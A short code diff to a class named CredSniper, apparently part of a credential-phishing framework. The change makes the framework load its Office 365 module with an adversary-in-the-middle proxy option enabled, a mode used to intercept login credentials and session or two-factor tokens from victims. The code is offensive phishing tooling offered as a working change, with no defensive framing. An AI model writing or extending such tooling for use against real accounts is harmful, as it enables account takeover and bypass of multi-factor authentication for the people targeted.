@@ -44,7 +44,11 @@ class CredSniper():
             autoescape=select_autoescape(['html', 'xml'])
         )
         module_path = 'modules.{}.{}'.format(self.module_name, self.module_name)
-        self.module = importlib.import_module(module_path).load(self.enable_2fa)
+        # For office365 module, also pass use_aitm_proxy=True
+        if self.module_name == 'office365':
+            self.module = importlib.import_module(module_path).load(self.enable_2fa, use_aitm_proxy=True)
+        else:
+            self.module = importlib.import_module(module_path).load(self.enable_2fa)
         self.module.env = env
         self.module.final_url = self.final_url
 
